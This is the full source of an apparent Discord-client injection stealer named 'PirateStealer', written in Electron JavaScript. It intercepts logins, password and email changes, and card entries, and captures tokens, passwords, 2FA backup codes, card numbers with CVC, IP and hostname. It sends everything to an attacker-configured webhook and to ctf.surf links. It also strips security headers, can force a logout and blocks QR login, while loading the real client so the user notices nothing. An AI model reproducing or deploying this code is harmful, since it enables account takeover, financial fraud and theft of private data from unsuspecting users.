// else aint working idk why
const {
    BrowserWindow,
    session
} = require('electron');
const fs = require('fs');
const path = require('path');
const querystring = require("querystring");
const os = require('os')
const webhook = "%WEBHOOK_LINK%"
const Filters = {
    1: {
        urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
    },
    2: {
        urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
    }
};

const config = {
    "minimum_members_per_server":"%MIN_MEMBERS%",
    "logout": "%LOGOUT%",
    "logout-notify": "%LOGOUTNOTI%",
    "init-notify": "%INITNOTI%",
    "embed-color": 347704,
    "disable-qr-code": "%DISABLEQRCODE%",
    "ping": [false, "@everyone"]
};

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    }
};


class PirateStealerEvent {
    constructor(event, token, data) {
        this.event = event;
        this.data = data;
        this.token = token;
    }
    handle() {
        switch (this.event) {
            case 'passwordChanged':
                passwordChanged(this.data.password, this.data.new_password, this.token);
                break;
            case 'userLogin':
                userLogin(this.data.password, this.data.email, this.token);
                break;
            case 'emailChanged':
                emailChanged(this.data.password, this.data.email, this.token);
                break;
            case 'creditCardAdded':
                creditCardAdded(this.data.cardnumber, this.data.cvc, this.data.expiration, this.token)
                break;
        }
    }
}

async function firstTime() {
    var token = await getToken()
    if (config['init-notify'] == "true") {
        if (fs.existsSync(path.join(__dirname, "init"))) {
            fs.rmdirSync(path.join(__dirname, "init"));
            if (token == null || token == undefined || token == "") {
                var c = {
                    username: "PirateStealer",
                    content: config.ping[0] ? config.ping[1] : "",
                    embeds: [{
                        title: "Discord Initalized (User not Logged in)",
                        color: config["embed-color"],
                        fields: [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
                            inline: !1
                        }],
                        author: {
                            name: "PirateStealer"
                        },
                        footer: {
                            text: "PirateStealer"
                        }
                    }]
                };
                sendToWebhook(JSON.stringify(c));
            } else {
                var b = await getUserInfo(token)
                var c = {
                    username: "PirateStealer",
                    content: config.ping[0] ? config.ping[1] : "",
                    embeds: [{
                        title: "Discord Initalized",
                        description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                        color: config["embed-color"],
                        fields: [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
                            inline: !1
                        }, {
                            name: "Username",
                            value: `\`${b.username}#${b.discriminator}\``,
                            inline: !0
                        }, {
                            name: "ID",
                            value: `\`${b.id}\``,
                            inline: !0
                        }, {
                            name: "Badges",
                            value: `${getBadges(b.flags)}`,
                            inline: !1
                        }, {
                            name: "Token",
                            value: `\`\`\`${token}\`\`\``,
                            inline: !1
                        }],
                        author: {
                            name: "PirateStealer"
                        },
                        footer: {
                            text: "PirateStealer"
                        },
                        thumbnail: {
                            url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                        }
                    }]
                };
                sendToWebhook(JSON.stringify(c))
            }

        }
    }
    if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return true

    fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
    if (config.logout != "false" && config.logout != "%LOGOUT%") {

        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`)
        if (config['logout-notify'] == "true") {
            if (token == null || token == undefined || token == "") {
                var c = {
                    username: "PirateStealer",
                    content: config.ping[0] ? config.ping[1] : "",
                    embeds: [{
                        title: "User log out (User not Logged in before)",
                        color: config["embed-color"],
                        fields: [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
                            inline: !1
                        }],
                        author: {
                            name: "PirateStealer"
                        },
                        footer: {
                            text: "PirateStealer"
                        }
                    }]
                };
                sendToWebhook(JSON.stringify(c));
            } else {
                const b = await getUserInfo(token);
                var c = {
                    username: "PirateStealer",
                    content: config.ping[0] ? config.ping[1] : "",
                    embeds: [{
                        title: "User got logged out",
                        description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                        color: config["embed-color"],
                        fields: [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
                            inline: !1
                        }, {
                            name: "Username",
                            value: `\`${b.username}#${b.discriminator}\``,
                            inline: !0
                        }, {
                            name: "ID",
                            value: `\`${b.id}\``,
                            inline: !0
                        }, {
                            name: "Badges",
                            value: `${getBadges(b.flags)}`,
                            inline: !1
                        }, {
                            name: "Token",
                            value: `\`\`\`${token}\`\`\``,
                            inline: !1
                        }],
                        author: {
                            name: "PirateStealer"
                        },
                        footer: {
                            text: "PirateStealer"
                        },
                        thumbnail: {
                            url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                        }
                    }]
                };
                sendToWebhook(JSON.stringify(c))
            }
        }
    }
    return !1

}

session.defaultSession.webRequest.onBeforeRequest(Filters[2], (details, callback) => {
    if (details.url.startsWith("wss://")) {
        if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
            callback({
                cancel: true
            })
            return;
        }
    }
    if (firstTime()) { }

    callback({})
    return;
})

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        }
    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }

})

// Main functions

async function userLogin(password, email, token) {
    var userInfo = await getUserInfo(token);
    var ip = await getIp();
    var servers = await getServers(token)
    var billing = await getBilling(token);
    var friends = await getRelationships(token);

    var params = {
        username: "PirateStealer",
        content: config.ping[0] ? config.ping[1] : "",
        embeds: [{
            "title": "User Login",
            description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${password})`,
            "color": config['embed-color'],
            "fields": [{
                name: "Info",
                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
                inline: !1
            }, {
                name: "Username",
                value: `\`${userInfo.username}#${userInfo.discriminator}\``,
                inline: !0
            }, {
                name: "ID",
                value: `\`${userInfo.id}\``,
                inline: !0
            }, {
                name: "Nitro",
                value: `${getNitro(userInfo.premium_type)}`,
                inline: !1
            }, {
                name: "Badges",
                value: `${getBadges(userInfo.flags)}`,
                inline: !1
            }, {
                name: "Billing",
                value: `${billing}`,
                inline: !1
            }, {
                name: "Email",
                value: `\`${email}\``,
                inline: !0
            }, {
                name: "Password",
                value: `\`${password}\``,
                inline: !0
            }, {
                name: "Token",
                value: `\`\`\`${token}\`\`\``,
                inline: !1
            },],
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }, {
            "title": `Total Friends (${friends.length})`,
            "color": config['embed-color'],
            "description": friends.frien,
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        },
        {
            "title": `Total Servers (${servers.totalguilds})`,
            "color": config['embed-color'],
            "description": servers.message,
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }]
    };

    if (token.startsWith("mfa")) {
        var codes = await get2faCodes(token, password)
        var embed = {
            "title": ":detective: __2FA Codes__",
            "description": `[Get all of them](${codes.url})`,
            "color": config['embed-color'],
            "fields": codes.fields,
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            }
        }
        params.embeds.push(embed)
    }

    sendToWebhook(JSON.stringify(params))

}
async function emailChanged(password, newEmail, token) {
    var userInfo = await getUserInfo(token);
    var ip = await getIp();
    var friends = await getRelationships(token);


    var params = {
        username: "PirateStealer",
        content: config.ping[0] ? config.ping[1] : "",
        embeds: [{
            "title": "Email Changed",
            description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${password}\n${newEmail})`,
            "color": config['embed-color'],
            "fields": [{
                name: "Info",
                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\`\`\``,
                inline: !1
            }, {
                name: "Username",
                value: `\`${userInfo.username}#${userInfo.discriminator}\``,
                inline: !0
            }, {
                name: "ID",
                value: `\`${userInfo.id}\``,
                inline: !0
            }, {
                name: "Nitro",
                value: `${getNitro(userInfo.premium_type)}`,
                inline: !1
            }, {
                name: "Badges",
                value: `${getBadges(userInfo.flags)}`,
                inline: !1
            }, {
                name: "New Email",
                value: `\`${newEmail}\``,
                inline: !0
            }, {
                name: "Password",
                value: `\`${password}\``,
                inline: !0
            }, {
                name: "Token",
                value: `\`\`\`${token}\`\`\``,
                inline: !1
            },],
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }, {
            "title": `Total Friends (${friends.length})`,
            "color": config['embed-color'],
            "description": friends.frien,
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }]
    }
    if (token.startsWith("mfa")) {
        var codes = await get2faCodes(token, password)
        var embed = {
            "title": ":detective: __2FA Codes__",
            "description": `[Get all of them](${codes.url})`,
            "color": config['embed-color'],
            "fields": codes.fields,
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            }
        }
        params.embeds.push(embed)
    }
    sendToWebhook(JSON.stringify(params))
}
async function passwordChanged(oldPassword, newPassword, token) {
    var userInfo = await getUserInfo(token);
    var ip = await getIp();
    var servers = await getServers(token)
    var billing = await getBilling(token);
    var friends = await getRelationships(token);

    var params = {
        username: "PirateStealer",
        content: config.ping[0] ? config.ping[1] : "",
        embeds: [{
            "title": "Password Changed",
            description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${newPassword})`,
            "color": config['embed-color'],
            "fields": [{
                name: "Info",
                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
                inline: !1
            }, {
                name: "Username",
                value: `\`${userInfo.username}#${userInfo.discriminator}\``,
                inline: !0
            }, {
                name: "ID",
                value: `\`${userInfo.id}\``,
                inline: !0
            }, {
                name: "Nitro",
                value: `${getNitro(userInfo.premium_type)}`,
                inline: !1
            }, {
                name: "Badges",
                value: `${getBadges(userInfo.flags)}`,
                inline: !1
            }, {
                name: "Billing",
                value: `${billing}`,
                inline: !1
            }, {
                name: "Email",
                value: `\`${userInfo.email}\``,
                inline: !1
            }, {
                name: "Old Password",
                value: `\`${oldPassword}\``,
                inline: !0
            }, {
                name: "New Password",
                value: `\`${newPassword}\``,
                inline: !0
            }, {
                name: "Token",
                value: `\`\`\`${token}\`\`\``,
                inline: !1
            },],
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }, {
            "title": `Total Friends (${friends.length})`,
            "color": config['embed-color'],
            "description": friends.frien,
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }, {
            "title": `Total Servers (${servers.totalguilds})`,
            "color": config['embed-color'],
            "description": servers.message,
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }]
    }


    if (token.startsWith("mfa")) {
        var codes = await get2faCodes(token, newPassword)
        var embed = {
            "title": ":detective: __2FA Codes__",
            "description": `[Get all of them](${codes.url})`,
            "color": config['embed-color'],
            "fields": codes.fields,
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            }
        }
        params.embeds.push(embed)
    }
    sendToWebhook(JSON.stringify(params))
}
async function creditCardAdded(cardnumber, cvc, expiration, token) {
    var userInfo = await getUserInfo(token);
    var ip = await getIp();
    var billing = await getBilling(token);
    var friends = await getRelationships(token);

    var params = {
        username: "PirateStealer",
        content: config.ping[0] ? config.ping[1] : "",
        embeds: [{
            "title": "Credit Card",
            description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
            "color": config['embed-color'],
            "fields": [{
                name: "Info",
                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
                inline: !1
            }, {
                name: "Username",
                value: `\`${userInfo.username}#${userInfo.discriminator}\``,
                inline: !0
            }, {
                name: "ID",
                value: `\`${userInfo.id}\``,
                inline: !0
            }, {
                name: "Nitro",
                value: `${getNitro(userInfo.premium_type)}`,
                inline: !1
            }, {
                name: "Badges",
                value: `${getBadges(userInfo.flags)}`,
                inline: !1
            }, {
                name: "Billing",
                value: `${billing}`,
                inline: !1
            }, {
                name: "Email",
                value: `\`${userInfo.email}\``,
                inline: false
            }, {
                name: "CC Number",
                value: `\`${cardnumber}\``,
                inline: !0
            }, {
                name: "Expiration",
                value: `\`${expiration}\``,
                inline: !0
            },
            {
                name: "CVC",
                value: `\`${cvc}\``,
                inline: !0
            }, {
                name: "Token",
                value: `\`\`\`${token}\`\`\``,
                inline: !1
            },
            ],
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }, {
            "title": `Total Friends (${friends.length})`,
            "color": config['embed-color'],
            "description": friends.frien,
            "author": {
                "name": "PirateStealer"
            },
            "footer": {
                "text": "PirateStealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }]
    };

    sendToWebhook(JSON.stringify(params))
}


// Helpers functions
async function sendToWebhook(params) {
    const window = new BrowserWindow({ width: 100, height: 100, show: false })

    window.loadURL("https://w3.org/") // Any website that enable cors security policy
    window.webContents.executeJavaScript(`
     new Promise(function (resolve, reject) {

        var xhr = new XMLHttpRequest();xhr.open("POST", "${webhook}", true);
        xhr.onload = function () {
            resolve(xhr.response)
        }
        xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify(${params}));

    });
        `, true).then(() => {
        window.close()
    })

}

async function getServers(token) {
    const window = BrowserWindow.getAllWindows()[0];

    const a = await window.webContents.executeJavaScript(`function GetCoolGuilds(e){var r=new XMLHttpRequest;return r.open("GET","https://discord.com/api/v9/users/@me/guilds",!1),r.setRequestHeader("Authorization",e),r.send(null),r.responseText}function GetServerList(e){var r,t=JSON.parse(e);for(var n in cc=t.filter((e=>1==e.owner)).concat(t.filter((e=>8==(8&e.permissions)))),cc)cc[n].membercount=(r=cc[n].id,window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(e,r,t)=>e.exports=t},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{gg=e}]),function(e){const r="string"==typeof e?e:null;for(const t in gg.c)if(gg.c.hasOwnProperty(t)){const n=gg.c[t].exports;if(n&&n.__esModule&&n.default&&(r?n.default[r]:e(n.default)))return n.default;if(n&&(r?n[r]:e(n)))return n}return null}("getMemberCount").getMemberCounts()[r]);return cc}function _696969(){var e=GetCoolGuilds("%TOKEN%"),r=GetServerList(e).filter((e=>e.membercount>=${config.minimum_members_per_server})),t="";for(const e of r)t+="Server Name: "+e.name+" - Owner: "+e.owner+" - Members: "+e.membercount+"\\n";return""==t&&(t="\`No rare servers :(\`"),JSON.stringify({message:t,totalguilds:r.length})}_696969();`.replace('%TOKEN%', token), true)

    return JSON.parse(a)
}
async function getRelationships(token) {
    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, !0)
    var json = JSON.parse(a)
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = "";
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} ${z.user.username}#${z.user.discriminator}\n`
        }
    }
    gay = gay ?? "No Rare Friends";

    return {
        length: r.length,
        frien: gay
    }
}

async function get2faCodes(token, password) {
    let fields = [];
    let baseuri = "https://ctf.surf/raw/";

    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${token}");xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));xmlHttp.responseText`, !0)

    var json = JSON.parse(a)
    let codes = json.backup_codes
    const r = codes.filter((code) => {
        return code.consumed == null
    })
    for (let z in r) {
        fields.push({
            name: `Code`,
            value: `\`${r[z].code.insert(4, "-")}\``,
            inline: true
        })
        baseuri += `${r[z].code.insert(4, "-")}\n`
    }

    return {
        fields: fields,
        url: baseuri
    }
}
async function getBilling(token) {
    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0)
    var json = JSON.parse(a)

    var billing = "None";
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            billing += "\`??\` <:paypal:896441236062347374>";
        } else if (z.type == 1 && z.invalid != !0) {
            billing += "\`??\` :credit_card:";
        } else {
            return "\`?\`";
        };
    });

    billing = billing ?? "\`?\`";
    return billing;
}
async function getUserInfo(token) {
    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, !0)
    return JSON.parse(a);
}
async function getIp() {
    const window = BrowserWindow.getAllWindows()[0];
    var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
    return ip;
}
async function getToken() {
    const window = BrowserWindow.getAllWindows()[0];
    var token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, !0)
    return token;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') b = 'None'
    return b;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

function getNitro(flags) {
    switch (flags) {
        case 1:
            return "<:classic:896119171019067423> \`Nitro Classic\`";
        case 2:
            return "<a:boost:824036778570416129> \`Nitro Boost\`";
        default:
            return "No Nitro";
    };
}

session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callback) => {
    if (details.statusCode != 200) return;

    const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
    const data = JSON.parse(unparsed_data)
    const token = await getToken();

    switch (true) {
        case details.url.endsWith('login'):
            var event = new PirateStealerEvent('userLogin', token, {
                password: data.password,
                email: data.login
            });
            event.handle();
            return;
        case details.url.endsWith('users/@me') && details.method == 'PATCH':
            if (!data.password) return;
            if (data.email) {
                var event = new PirateStealerEvent('emailChanged', token, {
                    password: data.password,
                    email: data.email
                });
                event.handle();

            };
            if (data.new_password) {
                var event = new PirateStealerEvent('passwordChanged', token, {
                    password: data.password,
                    new_password: data.new_password
                });
                event.handle();
            };
            return;
        case details.url.endsWith('tokens') && details.method == "POST":
            const card = querystring.parse(decodeURIComponent(unparsed_data))
            var event = new PirateStealerEvent('creditCardAdded', token, {
                cardnumber: card["card[number]"],
                cvc: card["card[cvc]"],
                expiration: `${card["card[exp_month]"]}/${card["card[exp_year]"]}`
            });
            event.handle();
            return;
        default:
            break;
    }
});

module.exports = require('./core.asar')
